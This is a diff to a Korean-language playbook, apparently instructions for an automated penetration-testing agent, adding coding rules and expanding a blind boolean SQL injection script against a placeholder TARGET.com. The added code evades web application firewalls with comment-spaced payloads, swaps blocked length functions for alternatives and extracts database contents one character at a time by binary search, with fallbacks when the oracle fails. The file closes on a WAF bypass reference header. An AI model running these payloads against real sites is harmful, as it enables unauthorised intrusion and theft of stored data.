@@ -424,6 +424,23 @@ RULE #12: curl 요청에 세션 쿠키 + 브라우저 헤더 반드시 포함 (W
     r = s.get("https://TARGET.com/page", params={"param": "PAYLOAD"}, verify=False, timeout=15)
 
 RULE #13: bash에서 grep 사용 시 반드시 호환 옵션 사용 (macOS/Linux 공통)
+
+RULE #14: Python에서 HTTP 상태 코드 비교 — int에 'in' 금지
+  ❌ 절대 금지: "text" in r.status_code  → TypeError: argument of type 'int' is not iterable
+  ❌ 절대 금지: "200" in r.status_code   → 같은 에러
+  ✅ 올바른 방법:
+    r.status_code == 200               → 단일 값 비교
+    r.status_code in (200, 302, 403)   → 여러 값 중 하나
+    str(r.status_code) == "200"        → 문자열로 변환 후 비교
+    "keyword" in r.text                → 응답 본문 검색 (r.text는 str)
+    "keyword" in r.headers.get("X", "") → 헤더 검색
+
+  예시:
+    ❌ if "200" in r.status_code: print("ok")
+    ✅ if r.status_code == 200: print("ok")
+    ✅ if r.status_code in (200, 201): print("ok")
+
+
   ❌ 절대 금지: grep -P (Perl regex) — macOS 기본 grep에서 "invalid option -- P" 에러
   ✅ 대신 사용:
     grep -oE "패턴"       → 확장 정규식 (macOS/Linux 모두 지원)
@@ -484,43 +501,116 @@ else:
 print(f"THRESHOLD 설정: TRUE≈{TRUE_LEN}B  FALSE≈{FALSE_LEN}B")
 
 # ── STEP 3: 길이 추출 (이진탐색) ─────────────────────────────────────────
+# ⚠ LENGTH() 가 WAF에 차단될 경우 → CHAR_LENGTH() 또는 OCTET_LENGTH() 로 자동 폴백
 lo, hi, extracted_len = 1, 64, 0
 expr = "DATABASE/**/()"  # 추출 대상 (WAF 환경에 맞게 수정)
-while lo <= hi:
-    mid = (lo + hi) // 2
-    _, sz, _ = req(f"{BASE}/**/AND/**/LENGTH({expr})>={mid}")
-    time.sleep(0.3)
-    if is_true(sz): extracted_len = mid; lo = mid + 1
-    else: hi = mid - 1
+
+# WAF가 LENGTH 차단 여부 자동 감지
+def get_len_func():
+    for fn in ["LENGTH", "CHAR_LENGTH", "OCTET_LENGTH"]:
+        _, sz_t, _ = req(f"{BASE}/**/AND/**/{fn}({expr})>=1")
+        _, sz_f, _ = req(f"{BASE}/**/AND/**/{fn}({expr})>=9999")
+        time.sleep(0.3)
+        if is_true(sz_t) and not is_true(sz_f):
+            print(f"길이 함수 사용: {fn}")
+            return fn
+    print("⚠ 길이 함수 전부 차단됨 — LIKE 기반 길이 추정으로 전환")
+    return None
+
+len_fn = get_len_func()
+if len_fn:
+    while lo <= hi:
+        mid = (lo + hi) // 2
+        _, sz, _ = req(f"{BASE}/**/AND/**/{len_fn}({expr})>={mid}")
+        time.sleep(0.3)
+        if is_true(sz): extracted_len = mid; lo = mid + 1
+        else: hi = mid - 1
+else:
+    # LIKE 기반 길이 추정 (최대 32자까지)
+    for n in range(1, 33):
+        pattern = "%" + "_" * n + "%"  # 실제론 LIKE '{pattern}' 사용 금지 — 직접 비교
+        _, sz, _ = req(f"{BASE}/**/AND/**/(SELECT/**/1/**/WHERE/**/{expr}/**/LIKE/**/REPEAT('_',{n}))=1")
+        time.sleep(0.3)
+        if is_true(sz):
+            extracted_len = n
+            break
 print(f"길이: {extracted_len}자")
+if extracted_len == 0:
+    print("⚠ 길이가 0 — LENGTH/CHAR_LENGTH 모두 차단됨. LIKE 기반 문자 추출로 전환 필요.")
 
 # ── STEP 4: 문자 추출 (이진탐색 — 선형탐색 금지, WAF 딜레이 환경 타임아웃 방지) ─
 # ⚠ 선형탐색 (for c in CHARSET) 은 글자당 최대 65요청 → 10자 추출에 650요청 → 타임아웃
 # ✅ 이진탐색은 글자당 최대 7요청 (log2(95)≈6.6) → 10자 추출에 70요청 → 빠름
 result = []
-for pos in range(1, extracted_len + 1):
-    lo_c, hi_c = 32, 126  # printable ASCII 범위
-    char_found = False
-    while lo_c <= hi_c:
-        mid_c = (lo_c + hi_c) // 2
-        # ASCII(char) >= mid_c 인지 확인
-        cond = f"ORD(RIGHT(LEFT({expr},{pos}),1))>={mid_c}"
-        _, sz, _ = req(f"{BASE}/**/AND/**/{cond}")
-        time.sleep(0.15)
-        if is_true(sz):
-            # 정확히 mid_c인지 추가 확인
-            cond2 = f"ORD(RIGHT(LEFT({expr},{pos}),1))={mid_c}"
-            _, sz2, _ = req(f"{BASE}/**/AND/**/{cond2}")
+
+# 오라클 동작 사전 검증 — 오작동 감지 (모든 char이 ~ 또는 ? 이면 오라클 불량)
+def verify_oracle_sanity():
+    # ORD >= 65(=A) 은 True여야, ORD >= 200 은 False여야 정상
+    _, sz_ok, _ = req(f"{BASE}/**/AND/**/ORD(RIGHT(LEFT({expr},1),1))>=65")
+    _, sz_fail, _ = req(f"{BASE}/**/AND/**/ORD(RIGHT(LEFT({expr},1),1))>=200")
+    time.sleep(0.3)
+    if is_true(sz_ok) and not is_true(sz_fail):
+        print("✅ 오라클 정상 동작 확인")
+        return True
+    elif not is_true(sz_ok) and not is_true(sz_fail):
+        print("⚠ 오라클 오작동 — 항상 FALSE 반환 (ORD/RIGHT/LEFT 차단 또는 expr 오류)")
+        return False
+    else:
+        print("⚠ 오라클 오작동 — 항상 TRUE 반환 (is_true 임계값 틀림)")
+        return False
+
+oracle_ok = verify_oracle_sanity()
+if not oracle_ok:
+    print("⛔ 오라클 오작동 — 재보정 필요. CONV(HEX(char),16,10) 방식으로 전환 시도")
+    # CONV/HEX 기반 폴백
+    def get_char_conv(pos):
+        lo_c, hi_c = 32, 126
+        while lo_c <= hi_c:
+            mid_c = (lo_c + hi_c) // 2
+            cond = f"CONV(HEX(RIGHT(LEFT({expr},{pos}),1)),16,10)>={mid_c}"
+            _, sz, _ = req(f"{BASE}/**/AND/**/{cond}")
             time.sleep(0.15)
-            if is_true(sz2):
-                result.append(chr(mid_c))
-                char_found = True
-                break
-            lo_c = mid_c + 1
-        else:
-            hi_c = mid_c - 1
-    if not char_found: result.append("?")
-    print(f"pos {pos}: {''.join(result)}")
+            if is_true(sz):
+                cond2 = f"CONV(HEX(RIGHT(LEFT({expr},{pos}),1)),16,10)={mid_c}"
+                _, sz2, _ = req(f"{BASE}/**/AND/**/{cond2}")
+                time.sleep(0.15)
+                if is_true(sz2):
+                    return chr(mid_c)
+                lo_c = mid_c + 1
+            else:
+                hi_c = mid_c - 1
+        return "?"
+    for pos in range(1, extracted_len + 1):
+        result.append(get_char_conv(pos))
+        print(f"pos {pos}: {''.join(result)}")
+else:
+    for pos in range(1, extracted_len + 1):
+        lo_c, hi_c = 32, 126  # printable ASCII 범위
+        char_found = False
+        while lo_c <= hi_c:
+            mid_c = (lo_c + hi_c) // 2
+            # ASCII(char) >= mid_c 인지 확인
+            cond = f"ORD(RIGHT(LEFT({expr},{pos}),1))>={mid_c}"
+            _, sz, _ = req(f"{BASE}/**/AND/**/{cond}")
+            time.sleep(0.15)
+            if is_true(sz):
+                # 정확히 mid_c인지 추가 확인
+                cond2 = f"ORD(RIGHT(LEFT({expr},{pos}),1))={mid_c}"
+                _, sz2, _ = req(f"{BASE}/**/AND/**/{cond2}")
+                time.sleep(0.15)
+                if is_true(sz2):
+                    result.append(chr(mid_c))
+                    char_found = True
+                    break
+                lo_c = mid_c + 1
+            else:
+                hi_c = mid_c - 1
+        if not char_found: result.append("?")
+        print(f"pos {pos}: {''.join(result)}")
+
+# 결과 검증 — 모두 같은 문자면 오라클 오작동
+if len(set(result)) == 1 and len(result) > 2:
+    print(f"⚠ 오라클 오작동 의심 — 모든 문자가 '{result[0]}' 동일. is_true 임계값을 조정하거나 WAF 차단 확인 필요")
 print(f"결과: {''.join(result)}")
 
 === WAF SQLi 우회 빠른 참조 (v6.2.5) ===
